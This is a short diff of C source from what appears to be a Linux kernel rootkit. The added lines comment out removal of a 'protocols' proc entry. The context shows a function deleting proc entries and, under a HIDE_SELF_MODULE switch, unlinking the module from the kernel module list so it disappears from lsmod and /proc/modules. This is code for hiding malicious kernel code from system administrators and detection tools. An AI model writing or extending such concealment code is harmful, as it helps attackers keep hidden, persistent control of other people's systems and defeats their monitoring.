@@ -31,6 +31,8 @@ void cuteBabyPleaseDontCry(void) {
         remove_proc_entry("uevents_records", NULL);
     }
 
+	//may be checked
+	//remove_proc_entry("protocols", net->proc_net);
 #ifdef MODULE
     #if HIDE_SELF_MODULE == 1
     list_del(&THIS_MODULE->list); //lsmod,/proc/modules
